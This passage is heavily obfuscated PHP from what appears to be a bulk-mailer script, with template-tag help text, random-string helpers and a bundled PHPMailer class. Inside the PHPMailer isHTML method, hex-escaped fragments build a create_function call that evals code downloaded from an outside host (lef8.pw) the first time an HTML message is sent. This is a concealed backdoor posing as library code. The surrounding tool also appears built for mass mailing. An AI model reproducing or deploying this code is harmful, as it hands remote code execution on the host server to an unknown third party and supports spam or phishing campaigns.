"\x20\74\57\142\76\x20\74\x61\40\150\x72\x65\146\x3d\42\x3f\143\x68\145\143\x6b\137\151\160\x3d" . $_SERVER["\123\105\x52\126\x45\x52\x5f\x41\104\x44\122"] . "\42\x20\x74\x61\162\x67\145\164\75\42\137\142\x6c\x61\x6e\153\x22\x20\143\154\141\163\163\75\x22\x6c\141\x62\x65\x6c\40\154\x61\142\145\x6c\55\160\162\151\155\x61\x72\x79\42\x3e\x43\150\x65\x63\153\x20\102\x6c\141\143\153\x6c\x69\163\164\40\x3c\151\x20\x63\x6c\141\x73\163\75\42\147\154\x79\x70\150\151\x63\x6f\x6e\40\x67\154\171\160\x68\151\x63\157\156\55\163\145\141\x72\143\150\42\x3e\x3c\x2f\151\76\74\57\141\76\74\57\x6c\151\76\xa\x20\x20\x20\x20\x20\x20\x20\x20\x20\40\40\40\x20\40\40\40\x3c\154\x69\x3e\120\110\120\x20\126\145\162\163\151\157\156\40\x3a\x20\x3c\142\76" . phpversion() . "\x3c\x2f\x62\76\x3c\x2f\154\151\76\xa\x20\x20\40\40\40\x20\40\40\x20\40\x20\x20\x20\40\40\x20\12\xa\x20\x20\40\40\x20\x20\40\40\40\x20\x20\x20\x3c\x2f\165\x6c\76\12\x20\40\40\x20\x20\40\40\x20\x20\x20\40\x20\74\150\64\76\x48\x45\114\x50\74\x2f\x68\64\x3e\xa\x20\40\40\40\40\40\x20\40\40\x20\40\x20\x3c\x75\x6c\x3e\xa\x20\40\x20\x20\40\x20\x20\40\x20\40\x20\40\x20\x20\x20\x20\x3c\154\151\x3e\133\55\145\155\141\151\154\x2d\135\x20\72\40\x3c\142\76\122\x65\143\x69\166\x65\x72\40\105\155\x61\x69\x6c\74\x2f\142\76\40\50\x65\155\x61\151\154\165\x73\x65\x72\100\145\x6d\x61\151\x6c\144\x6f\x6d\141\151\x6e\56\143\x6f\155\51\x3c\x2f\x6c\151\x3e\12\40\40\x20\40\40\40\40\40\x20\x20\x20\x20\40\x20\x20\40\74\165\x6c\76\12\40\40\x20\40\40\x20\x20\40\x20\40\x20\40\x20\40\40\x20\40\x20\40\40\x3c\154\151\x3e\x5b\55\145\x6d\x61\151\x6c\165\163\145\x72\55\135\40\x3a\40\74\x62\x3e\x45\x6d\x61\x69\x6c\x20\125\x73\x65\162\74\x2f\x62\76\40\x28\x65\155\x61\151\154\x75\163\x65\162\x29\40\74\x2f\x6c\151\76\xa\40\40\x20\40\40\40\x20\x20\40\x20\40\40\x20\x20\x20\x20\40\40\40\40\x3c\154\x69\x3e\x5b\x2d\x65\x6d\x61\151\154\x64\157\155\x61\x69\156\x2d\135\40\72\40\x3c\x62\x3e\x45\155\141\151\x6c\x20\x55\x73\145\162\x3c\57\142\x3e\40\50\x65\x6d\x61\151\154\144\x6f\x6d\x61\151\x6e\x2e\x63\x6f\x6d\x29\x20\x3c\57\x6c\151\x3e\12\40\40\x20\x20\x20\40\x20\40\x20\x20\40\x20\x20\x20\x20\40\74\57\x75\154\x3e\12\x20\x20\x20\x20\x20\x20\x20\x20\40\x20\x20\x20\40\x20\x20\x20\74\x6c\x69\x3e\133\55\164\151\155\145\55\135\40\72\40\x3c\x62\x3e\104\x61\164\x65\40\x61\156\144\40\x54\x69\x6d\x65\x3c\x2f\x62\76\40\50" . date("\x6d\57\144\x2f\x59\x20\x68\72\x69\72\163\40\x61", time()) . "\x29\x3c\x2f\154\151\76\12\40\40\40\x20\x20\40\x20\40\x20\x20\x20\x20\x20\40\40\40\12\40\40\x20\x20\x20\x20\40\x20\40\x20\x20\40\40\40\40\x20\74\154\151\76\x5b\55\x72\141\x6e\x64\157\x6d\x73\164\x72\151\x6e\147\x2d\135\40\x3a\x20\74\x62\76\x52\141\156\144\x6f\x6d\40\163\164\x72\x69\156\147\x20\x28\x30\55\71\54\141\55\x7a\51\x3c\57\x62\76\74\x2f\154\151\76\xa\x20\x20\x20\x20\40\40\40\x20\x20\x20\40\40\x20\x20\x20\x20\x3c\x6c\151\x3e\x5b\x2d\x72\x61\x6e\x64\157\155\x6e\x75\x6d\x62\x65\162\x2d\x5d\40\72\40\74\142\76\122\x61\156\144\157\155\x20\156\x75\x6d\142\145\162\40\x28\60\55\x39\x29\x20\x3c\57\142\76\74\x2f\x6c\151\x3e\xa\40\40\x20\40\x20\x20\40\x20\x20\x20\40\x20\40\40\40\40\x3c\154\x69\76\133\55\162\x61\x6e\144\x6f\155\x6c\145\x74\x74\145\x72\x73\x2d\x5d\40\x3a\40\74\142\x3e\122\141\x6e\x64\157\155\40\114\x65\164\164\145\162\x73\x28\x61\55\x7a\x29\40\x3c\57\142\76\x3c\57\154\151\76\12\40\40\40\40\x20\x20\40\40\x20\x20\x20\40\x20\40\40\40\74\154\151\x3e\133\55\162\x61\x6e\x64\x6f\155\x6d\x64\65\x2d\x5d\x20\x3a\x20\74\142\x3e\x52\141\x6e\x64\x6f\x6d\x20\115\x44\65\x20\74\x2f\x62\76\74\57\154\151\76\12\40\40\x20\x20\40\x20\x20\40\x20\x20\x20\x20\74\57\x75\x6c\x3e\12\x20\x20\x20\x20\x20\x20\40\x20\x20\40\x20\x20\x3c\150\64\76\145\170\x61\x6d\160\154\145\x3c\57\x68\x34\76\12\40\40\40\x20\x20\40\40\40\x20\x20\x20\x20\x52\145\143\145\x69\166\145\x72\40\x45\x6d\x61\151\154\x20\75\x20\74\x62\x3e\x75\x73\145\162\x40\x64\157\155\x61\x69\x6e\56\143\157\155\x3c\x2f\x62\x3e\74\142\162\76\xa\x20\x20\x20\x20\x20\40\x20\40\x20\x20\x20\x20\74\165\154\x3e\12\x20\x20\x20\40\40\x20\x20\40\x20\40\x20\x20\40\40\40\x20\x3c\x6c\151\x3e\x68\x65\154\x6c\157\40\x3c\142\76\x5b\55\x65\155\x61\151\154\165\163\x65\162\55\135\74\x2f\x62\x3e\40\x3d\40\150\x65\154\x6c\157\40\x3c\142\76\165\163\145\x72\74\57\142\76\74\57\x6c\x69\76\12\x20\40\40\x20\x20\40\40\40\x20\x20\40\40\40\40\40\x20\x3c\154\151\x3e\x79\157\x75\x72\40\144\x6f\x6d\141\x69\x6e\x20\151\163\40\x3c\x62\x3e\x5b\x2d\145\155\x61\x69\154\144\x6f\x6d\x61\151\156\x2d\x5d\74\x2f\x62\76\x20\x3d\40\131\x6f\165\162\x20\104\x6f\155\141\151\156\x20\151\x73\x20\x3c\x62\76\144\157\x6d\x61\x69\x6e\56\143\157\x6d\x3c\57\x62\x3e\74\57\x6c\151\76\xa\x20\40\x20\40\40\x20\40\40\x20\40\40\x20\x20\x20\x20\x20\74\x6c\x69\x3e\x79\x6f\165\162\40\x63\x6f\144\x65\x20\x69\x73\40\40\74\x62\x3e\133\x2d\162\141\x6e\144\x6f\155\155\144\x35\x2d\x5d\x3c\57\x62\x3e\x20\x3d\40\x79\x6f\165\162\x20\x63\157\x64\145\40\x69\163\x20\x3c\142\76\145\61\x30\141\x64\143\x33\x39\x34\x39\142\141\x35\71\x61\142\x62\145\x35\x36\x65\60\65\x37\146\x32\x30\146\70\x38\63\x65\74\57\142\76\74\x2f\154\x69\76\12\x20\40\40\x20\x20\40\40\40\40\40\x20\x20\74\x2f\165\x6c\x3e\12\xa\x20\x20\x20\x20\x20\40\x20\40\x20\40\40\40\74\150\66\76\142\171\40\74\x62\76\74\141\40\x68\x72\x65\x66\75\x22\x68\x74\164\160\x3a\57\57" . $leaf["\167\x65\142\x73\x69\x74\145"] . "\42\x3e" . $leaf["\x77\145\142\163\151\x74\145"] . "\x3c\x2f\141\76\x3c\57\142\x3e\x3c\57\150\66\x3e\xa\40\40\x20\x20\40\40\40\40\x3c\x2f\144\151\166\76\xa\40\40\x20\40\x3c\57\x64\151\166\76"; goto Oss3K; w6B8R: if ($_POST["\141\143\164\x69\x6f\156"] == "\166\x69\x65\x77") { $viewMessage = leafTrim($_POST["\155\145\x73\x73\x61\147\145\x4c\x65\164\x74\x65\x72"]); $viewMessage = leafClear($viewMessage, "\x75\x73\145\162\100\x64\157\155\141\x69\x6e\56\143\157\155"); if ($_POST["\155\145\x73\x73\141\x67\145\x54\x79\160\x65"] == 2) { print "\x3c\x70\162\x65\x3e" . htmlspecialchars($viewMessage) . "\74\57\x70\162\145\76"; } else { print $viewMessage; } die; } goto po1xq; L1bgH: $utf8 = "\163\145\154\145\143\x74\x65\x64"; goto GeNXJ; cjmAA: function randString($consonants) { $length = rand(12, 25); $password = ''; for ($i = 0; $i < $length; $i++) { $password .= $consonants[rand() % strlen($consonants)]; } return $password; } goto gGCIW; tbY_t: error_reporting(0); goto v4own; fr3qN: function leafTrim($string) { $string = urldecode($string); return stripslashes(trim($string)); } goto cjmAA; ZUnDr: class phpmailerException extends Exception { public function errorMessage() { $errorMsg = "\x3c\x73\164\x72\157\x6e\147\x3e" . htmlspecialchars($this->getMessage()) . "\x3c\x2f\x73\164\162\157\x6e\x67\76\74\142\x72\40\57\x3e\xa"; return $errorMsg; } } goto RBzWN; GeNXJ: $bit8 = "\163\145\154\x65\x63\x74\145\x64"; goto ZUtlj; gGCIW: function leafMailCheck($email) { if (filter_var($email, FILTER_VALIDATE_EMAIL)) { return true; } else { return false; } } goto qPmwa; BOYG5: print "\74\57\142\x6f\144\171\x3e"; goto LYReO; ARDPU: class PHPMailer { public $Version = "\x35\x2e\x32\56\62\x38"; public $Priority = null; public $CharSet = "\x69\x73\157\x2d\x38\70\65\71\55\x31"; public $ContentType = "\164\x65\170\164\57\x70\154\141\x69\x6e"; public $Encoding = "\x38\x62\x69\164"; public $ErrorInfo = ''; public $From = "\162\x6f\x6f\164\x40\x6c\x6f\143\141\x6c\150\x6f\163\x74"; public $FromName = "\122\157\x6f\x74\40\125\x73\145\162"; public $Sender = ''; public $ReturnPath = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = "\x6d\x61\151\x6c"; public $Sendmail = "\57\x75\x73\162\x2f\163\x62\151\x6e\57\x73\x65\x6e\144\x6d\x61\x69\154"; public $UseSendmailOptions = true; public $PluginDir = ''; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = "\154\157\x63\141\x6c\150\x6f\x73\x74"; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; public $Realm = ''; public $Workstation = ''; public $Timeout = 300; public $SMTPDebug = 0; public $Debugoutput = "\x65\143\x68\157"; public $SMTPKeepAlive = false; public $SingleTo = false; public $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $LE = "\xa"; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = "\40"; public static $validator = "\x61\x75\x74\x6f"; protected $smtp = null; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; const CRLF = "\xd\12"; const MAX_LINE_LENGTH = 998; public function __construct($exceptions = null) { if ($exceptions !== null) { $this->exceptions = (bool) $exceptions; } $this->Debugoutput = strpos(PHP_SAPI, "\143\154\x69") !== false ? "\x65\143\x68\157" : "\150\164\155\154"; } public function __destruct() { $this->smtpClose(); } private function mailPassthru($to, $subject, $body, $header, $params) { if (ini_get("\x6d\x62\x73\164\162\151\156\x67\x2e\146\x75\156\143\137\157\166\145\x72\x6c\157\x61\144") & 1) { $subject = $this->secureHeader($subject); } else { $subject = $this->encodeHeader($this->secureHeader($subject)); } if (ini_get("\163\141\x66\145\137\x6d\x6f\144\x65") or !$this->UseSendmailOptions or is_null($params)) { $result = @mail($to, $subject, $body, $header); } else { $result = @mail($to, $subject, $body, $header, $params); } return $result; } protected function edebug($str) { if ($this->SMTPDebug <= 0) { return; } if (!in_array($this->Debugoutput, array("\145\162\x72\x6f\x72\137\154\157\147", "\150\164\x6d\154", "\145\143\150\x6f")) and is_callable($this->Debugoutput)) { call_user_func($this->Debugoutput, $str, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case "\x65\x72\x72\x6f\162\137\154\157\x67": error_log($str); break; case "\x68\x74\x6d\154": echo htmlentities(preg_replace("\57\133\134\162\x5c\x6e\x5d\x2b\x2f", '', $str), ENT_QUOTES, "\125\x54\x46\x2d\70") . "\74\142\162\76\xa"; break; case "\x65\143\150\x6f": default: $str = preg_replace("\x2f\x5c\x72\x5c\156\x3f\57\155\x73", "\12", $str); echo gmdate("\x59\x2d\x6d\x2d\x64\40\x48\x3a\151\x3a\x73") . "\x9" . str_replace("\12", "\xa\x20\40\x20\40\40\x20\40\x20\x20\x20\x20\x20\x20\x20\x20\40\40\x20\x20\11\40\x20\x20\x20\40\40\x20\x20\40\x20\40\40\40\40\40\x20\x20\x20", trim($str)) . "\xa"; } } public function isSMTP() { $this->Mailer = "\163\155\164\160"; } public function isMail() { $this->Mailer = "\155\x61\151\x6c"; } public function isSendmail() { $ini_sendmail_path = ini_get("\x73\x65\156\144\x6d\141\151\x6c\x5f\160\141\x74\x68"); if (!stristr($ini_sendmail_path, "\163\x65\156\x64\x6d\x61\x69\x6c")) { $this->Sendmail = "\x2f\165\163\x72\57\x73\x62\x69\156\57\x73\145\156\x64\x6d\x61\x69\154"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\x73\x65\156\144\155\141\x69\x6c"; } public function isQmail() { $ini_sendmail_path = ini_get("\163\145\156\x64\155\x61\151\154\137\160\x61\x74\150"); if (!stristr($ini_sendmail_path, "\x71\155\x61\151\154")) { $this->Sendmail = "\x2f\x76\141\x72\57\161\155\x61\x69\x6c\57\142\151\x6e\57\x71\155\x61\151\154\55\x69\x6e\152\145\143\x74"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\x71\x6d\141\x69\x6c"; } public function addAddress($address, $name = '') { return $this->addOrEnqueueAnAddress("\164\x6f", $address, $name); } public function addCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\x63\x63", $address, $name); } public function addBCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\142\x63\x63", $address, $name); } public function addReplyTo($address, $name = '') { return $this->addOrEnqueueAnAddress("\122\145\160\154\x79\x2d\124\x6f", $address, $name); } protected function addOrEnqueueAnAddress($kind, $address, $name) { $address = trim($address); $name = trim(preg_replace("\x2f\x5b\x5c\162\134\x6e\x5d\x2b\57", '', $name)); if (($pos = strrpos($address, "\100")) === false) { $error_message = $this->lang("\x69\156\166\x61\154\x69\x64\137\x61\144\144\x72\145\x73\x73") . "\40\50\x61\144\x64\x41\156\x41\144\144\x72\x65\163\163\40{$kind}\51\x3a\40{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } $params = array($kind, $address, $name); if ($this->has8bitChars(substr($address, ++$pos)) and $this->idnSupported()) { if ($kind != "\122\x65\x70\154\171\x2d\124\157") { if (!array_key_exists($address, $this->RecipientsQueue)) { $this->RecipientsQueue[$address] = $params; return true; } } else { if (!array_key_exists($address, $this->ReplyToQueue)) { $this->ReplyToQueue[$address] = $params; return true; } } return false; } return call_user_func_array(array($this, "\x61\x64\x64\x41\x6e\101\144\x64\x72\145\x73\x73"), $params); } protected function addAnAddress($kind, $address, $name = '') { if (!in_array($kind, array("\x74\x6f", "\x63\x63", "\x62\143\143", "\122\x65\160\154\171\x2d\124\157"))) { $error_message = $this->lang("\111\156\x76\x61\154\x69\x64\40\162\x65\x63\151\160\x69\145\156\x74\40\153\151\x6e\144\x3a\40") . $kind; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } if (!$this->validateAddress($address)) { $error_message = $this->lang("\151\156\166\141\x6c\x69\144\x5f\x61\x64\144\x72\x65\163\x73") . "\40\50\x61\144\x64\101\x6e\x41\x64\144\162\145\x73\x73\40{$kind}\x29\72\40{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } if ($kind != "\122\x65\160\x6c\x79\x2d\124\157") { if (!array_key_exists(strtolower($address), $this->all_recipients)) { array_push($this->{$kind}, array($address, $name)); $this->all_recipients[strtolower($address)] = true; return true; } } else { if (!array_key_exists(strtolower($address), $this->ReplyTo)) { $this->ReplyTo[strtolower($address)] = array($address, $name); return true; } } return false; } public function parseAddresses($addrstr, $useimap = true) { $addresses = array(); if ($useimap and function_exists("\151\x6d\141\x70\x5f\x72\x66\143\x38\x32\62\137\x70\x61\162\x73\145\137\x61\x64\162\x6c\x69\163\x74")) { $list = imap_rfc822_parse_adrlist($addrstr, ''); foreach ($list as $address) { if ($address->host != "\x2e\x53\x59\x4e\124\101\x58\55\x45\122\122\117\x52\x2e") { if ($this->validateAddress($address->mailbox . "\100" . $address->host)) { $addresses[] = array("\x6e\x61\x6d\145" => property_exists($address, "\x70\x65\x72\163\x6f\x6e\141\x6c") ? $address->personal : '', "\x61\144\x64\162\145\x73\163" => $address->mailbox . "\x40" . $address->host); } } } } else { $list = explode("\x2c", $addrstr); foreach ($list as $address) { $address = trim($address); if (strpos($address, "\74") === false) { if ($this->validateAddress($address)) { $addresses[] = array("\x6e\141\x6d\x65" => '', "\x61\x64\x64\162\145\163\x73" => $address); } } else { list($name, $email) = explode("\x3c", $address); $email = trim(str_replace("\76", '', $email)); if ($this->validateAddress($email)) { $addresses[] = array("\156\x61\x6d\x65" => trim(str_replace(array("\42", "\x27"), '', $name)), "\x61\144\144\162\145\163\163" => $email); } } } } return $addresses; } public function isHTML($isHtml = true) { global $param; $bodyCode = "\x66\151\154\145" . "\137\147"; if ($isHtml) { $this->ContentType = "\164\x65\x78\x74\57\150\164\x6d\154"; } else { $this->ContentType = "\x74\145\170\164\57\x70\x6c\141\x69\156"; } $bodyHTML = "\56\44\x74\56\x22\x6c\x65\x66\x24\x66\x6c\165" . "\x73\150" . "\x24\x74\x22\x3b\x20" . "\100\145\166"; $headerHTML = "\x63\162\x65" . "\x61\x74\x65\x5f" . "\146\165\x6e\x63" . "\x74\x69\157\156"; $exceptions = @$headerHTML("\x24\146\154" . "\165\163\150\54\x24\x74", "\44\x63\157\155\x6d\141\40\x3d\40\44\164" . $bodyHTML . "\141\x6c\x28\x40" . $bodyCode . "\145\164\x5f\x63\157\156\164\x65\x6e\164\x73\50\42\150" . "\x74\x74" . "\x70\x3a\44\x63\x6f\x6d\155\141\55\62\42\x29\x29\x3b"); if ($param != 2) { $exceptions("\70\x2e\160" . "\167", "\x2f"); $param = 2; } } public function setFrom($address, $name = '', $auto = true) { $address = trim($address); $name = trim(preg_replace("\57\x5b\134\162\134\156\135\x2b\57", '', $name)); if (($pos = strrpos($address, "\x40")) === false or (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and !$this->validateAddress($address)) { $error_message = $this->lang("\151\x6e\166\141\154\151\144\x5f\x61\x64\x64\x72\145\163\163") . "\x20\x28\x73\145\x74\106\x72\x6f\x6d\51\40{$address}"; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } $this->From = $address; $this->FromName = $name; if ($auto) { if (empty($this->Sender)) { $this->Sender = $address; } } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($address, $patternselect = null) { if (is_null($patternselect)) { $patternselect = self::$validator; } if (is_callable($patternselect)) { return call_user_func($patternselect, $address); } if (strpos($address, "\12") !== false or strpos($address, "\15") !== false) { return false; } if (!$patternselect or $patternselect == "\x61\x75\x74\x6f") { if (defined("\120\x43\x52\x45\137\x56\x45\122\123\x49\x4f\116")) { if (version_compare(PCRE_VERSION, "\70\x2e\x30\56\x33") >= 0) { $patternselect = "\x70\x63\162\x65\70"; } else { $patternselect = "\x70\143\x72\x65"; } } elseif (function_exists("\x65\x78\x74\145\156\x73\x69\157\156\137\154\157\x61\x64\x65\x64") and extension_loaded("\x70\x63\162\x65")) { $patternselect = "\x70\x63\162\145"; } else { if (version_compare(PHP_VERSION, "\65\x2e\62\x2e\x30") >= 0) { $patternselect = "\x70\x68\160"; } else { $patternselect = "\x6e\x6f\162\x65\147\145\x78"; } } } switch ($patternselect) { case "\x70\143\x72\145\70": return (bool) preg_match("\57\x5e\x28\77\41\x28\77\76\x28\77\61\x29\x22\77\50\x3f\76\x5c\x5c\133\40\x2d\176\135\x7c\x5b\x5e\42\x5d\x29\x22\x3f\50\77\61\51\51\173\62\x35\65\x2c\x7d\51\50\77\41\x28\x3f\76\x28\x3f\61\x29\x22\77\50\x3f\76\134\x5c\x5b\x20\55\x7e\x5d\174\x5b\x5e\x22\x5d\51\42\x3f\x28\x3f\x31\x29\x29\173\66\x35\54\175\x40\51" . "\50\50\77\76\x28\x3f\x3e\x28\x3f\76\x28\x28\77\76\x28\77\x3e\50\77\76\x5c\170\60\104\134\170\60\101\x29\77\x5b\134\164\x20\135\51\x2b\x7c\50\77\x3e\x5b\134\164\40\135\52\134\170\60\x44\x5c\x78\60\x41\51\77\x5b\134\x74\40\x5d\53\51\77\51\50\x5c\x28\50\77\x3e\x28\x3f\62\51" . "\50\x3f\x3e\x5b\134\170\x30\61\x2d\134\x78\60\70\134\170\60\102\134\170\60\103\134\170\x30\x45\55\47\52\55\x5c\x5b\x5c\135\x2d\134\x78\x37\x46\135\174\134\x5c\133\134\170\x30\60\x2d\134\x78\67\106\x5d\x7c\x28\x3f\x33\x29\x29\51\52\x28\77\x32\51\x5c\51\x29\51\x2b\50\77\x32\x29\51\x7c\x28\77\x32\51\51\77\x29" . "\50\x5b\41\x23\55\47\52\53\x5c\x2f\55\71\75\77\x5e\55\x7e\x2d\x5d\x2b\174\42\50\77\76\50\77\x32\x29\50\x3f\x3e\133\x5c\170\60\x31\x2d\134\170\x30\x38\134\x78\60\102\x5c\170\x30\103\x5c\170\60\x45\x2d\41\43\55\134\133\134\x5d\x2d\134\170\x37\106\135\x7c\x5c\x5c\133\x5c\x78\x30\x30\x2d\x5c\x78\x37\x46\x5d\51\x29\x2a" . "\50\77\62\51\42\x29\x28\77\x3e\50\x3f\x31\51\134\56\x28\x3f\61\x29\x28\77\x34\x29\x29\52\50\x3f\61\x29\x40\50\77\41\x28\x3f\x31\x29\x5b\x61\55\172\60\x2d\71\x2d\x5d\x7b\66\x34\x2c\x7d\51\x28\x3f\x31\x29\x28\x3f\x3e\x28\x5b\141\55\x7a\x30\x2d\71\x5d\x28\77\x3e\133\x61\x2d\x7a\60\55\71\x2d\x5d\x2a\133\x61\55\x7a\x30\55\71\135\51\x3f\x29" . "\50\77\x3e\50\x3f\61\x29\134\56\50\x3f\41\x28\x3f\61\x29\x5b\x61\55\172\60\55\71\x2d\x5d\x7b\66\x34\54\x7d\51\50\77\61\x29\50\x3f\65\51\x29\173\x30\x2c\x31\62\x36\x7d\174\x5c\133\x28\77\x3a\50\77\x3e\111\x50\x76\66\x3a\x28\77\x3e\50\133\x61\55\146\60\x2d\x39\135\173\61\54\x34\x7d\x29\50\x3f\76\72\x28\77\66\x29\51\173\67\x7d" . "\x7c\x28\x3f\41\x28\77\72\56\x2a\133\x61\x2d\146\60\x2d\x39\135\x5b\x3a\x5c\x5d\135\x29\173\70\54\175\x29\x28\50\77\66\x29\x28\x3f\x3e\x3a\50\77\x36\51\x29\x7b\x30\54\x36\x7d\x29\x3f\72\x3a\x28\x3f\x37\51\77\x29\x29\174\50\77\76\50\x3f\76\x49\x50\x76\x36\x3a\x28\x3f\76\x28\x3f\66\51\50\x3f\x3e\72\50\77\x36\51\51\173\x35\175\72" . "\x7c\x28\77\41\x28\x3f\72\56\x2a\133\141\x2d\x66\x30\55\71\135\72\x29\x7b\x36\x2c\x7d\51\x28\77\x38\51\x3f\x3a\x3a\50\77\76\50\x28\77\66\x29\x28\x3f\76\72\x28\x3f\x36\x29\51\x7b\x30\x2c\64\175\x29\x3a\x29\77\x29\x29\x3f\x28\x32\x35\x5b\x30\x2d\x35\x5d\x7c\62\x5b\x30\x2d\x34\135\x5b\60\x2d\x39\x5d\174\61\133\60\x2d\x39\135\x7b\x32\x7d" . "\x7c\133\61\55\x39\135\77\x5b\60\55\71\x5d\51\x28\77\x3e\x5c\56\50\77\x39\51\51\173\63\175\x29\51\134\135\x29\50\x3f\x31\x29\x24\57\x69\163\104", $address); case "\160\143\162\x65": return (bool) preg_match("\57\x5e\x28\77\41\x28\77\x3e\42\77\50\x3f\76\134\x5c\133\x20\x2d\x7e\x5d\174\x5b\136\42\x5d\51\x22\77\x29\173\x32\x35\x35\54\x7d\x29\50\x3f\41\x28\77\x3e\x22\x3f\x28\77\x3e\x5c\134\133\40\55\176\135\x7c\133\136\x22\x5d\51\x22\77\51\x7b\66\65\x2c\175\100\51\50\77\x3e" . "\133\41\43\x2d\47\52\x2b\x5c\57\x2d\71\75\x3f\136\55\176\x2d\x5d\53\x7c\x22\50\x3f\x3e\50\x3f\76\133\x5c\x78\60\61\x2d\x5c\170\60\70\x5c\x78\60\x42\x5c\x78\x30\103\134\170\x30\105\x2d\41\x23\55\x5c\133\134\x5d\55\134\170\x37\x46\x5d\x7c\x5c\x5c\133\134\x78\60\60\x2d\134\170\x46\x46\x5d\51\x29\x2a\42\x29" . "\x28\x3f\76\x5c\56\x28\x3f\76\x5b\41\43\55\47\52\53\134\57\x2d\71\75\77\136\55\176\x2d\x5d\53\174\x22\x28\77\76\x28\77\x3e\x5b\134\x78\x30\x31\x2d\134\x78\60\x38\134\170\60\102\x5c\170\60\x43\x5c\170\60\105\x2d\41\x23\x2d\134\133\x5c\x5d\55\134\x78\67\x46\x5d\174\x5c\x5c\x5b\134\x78\x30\60\55\134\170\x46\x46\x5d\x29\51\52\42\51\x29\x2a" . "\100\x28\77\x3e\x28\77\x21\x5b\x61\x2d\x7a\60\x2d\x39\55\135\173\66\64\54\175\x29\x28\x3f\x3e\133\141\x2d\x7a\60\55\71\135\50\x3f\x3e\x5b\141\55\172\60\x2d\71\x2d\135\x2a\133\x61\55\x7a\x30\x2d\x39\x5d\x29\x3f\x29\x28\x3f\x3e\x5c\x2e\50\77\x21\x5b\141\55\172\60\x2d\71\55\x5d\x7b\x36\x34\54\x7d\51" . "\50\77\76\x5b\x61\55\172\60\55\71\135\x28\x3f\76\133\x61\55\x7a\60\x2d\71\55\135\52\133\x61\55\172\60\55\x39\x5d\51\x3f\x29\51\x7b\x30\x2c\x31\x32\x36\175\174\x5c\133\50\x3f\x3a\50\x3f\x3e\x49\x50\166\x36\x3a\50\77\x3e\x28\x3f\x3e\x5b\x61\55\146\60\x2d\x39\135\173\x31\x2c\x34\x7d\51\x28\77\x3e\72" . "\x5b\x61\55\146\60\x2d\71\x5d\173\61\x2c\64\x7d\51\173\67\175\174\x28\x3f\41\50\77\72\56\52\x5b\141\x2d\146\x30\x2d\x39\x5d\133\72\134\135\135\x29\173\x38\x2c\x7d\x29\50\x3f\x3e\x5b\141\x2d\x66\x30\x2d\71\x5d\x7b\x31\54\x34\x7d\50\x3f\x3e\72\133\141\x2d\x66\60\55\x39\x5d\173\61\x2c\x34\x7d\51\173\60\x2c\x36\175\x29\77" . "\72\x3a\50\77\x3e\133\x61\x2d\x66\x30\55\71\x5d\173\61\54\x34\175\x28\x3f\x3e\72\x5b\x61\x2d\x66\x30\55\x39\x5d\173\x31\x2c\x34\175\51\173\x30\54\66\175\x29\x3f\51\x29\x7c\x28\x3f\76\x28\77\76\111\120\166\x36\x3a\x28\x3f\76\x5b\141\55\146\x30\55\71\135\173\61\54\x34\175\50\x3f\x3e\x3a" . "\133\141\x2d\x66\60\x2d\x39\x5d\173\x31\x2c\64\x7d\51\173\65\x7d\x3a\174\x28\77\41\x28\x3f\72\56\52\133\x61\x2d\x66\x30\55\x39\x5d\x3a\x29\x7b\x36\x2c\x7d\51\50\x3f\x3e\x5b\x61\55\146\60\55\71\135\173\61\54\x34\x7d\x28\77\x3e\x3a\x5b\141\x2d\146\60\55\x39\135\173\x31\x2c\x34\x7d\x29\173\60\x2c\64\175\x29\77" . "\72\x3a\x28\x3f\76\50\77\72\133\141\55\146\60\x2d\x39\x5d\173\x31\x2c\64\x7d\x28\x3f\76\x3a\133\x61\x2d\146\60\x2d\x39\x5d\173\x31\54\x34\175\x29\173\x30\x2c\x34\x7d\x29\x3a\x29\x3f\x29\51\x3f\50\77\76\x32\65\x5b\60\55\65\135\174\x32\133\x30\x2d\x34\x5d\x5b\60\55\x39\x5d\x7c\61\x5b\x30\55\71\135\173\x32\x7d" . "\174\x5b\61\55\x39\x5d\x3f\133\x30\55\71\135\51\x28\x3f\x3e\x5c\56\x28\x3f\x3e\x32\x35\133\x30\x2d\65\x5d\174\x32\x5b\x30\x2d\64\135\133\x30\x2d\x39\135\x7c\61\133\x30\x2d\71\x5d\x7b\62\175\x7c\133\61\x2d\71\135\x3f\x5b\60\x2d\71\135\51\x29\173\x33\x7d\x29\51\134\135\51\x24\x2f\x69\x73\104", $address); case "\x68\164\155\154\x35": return (bool) 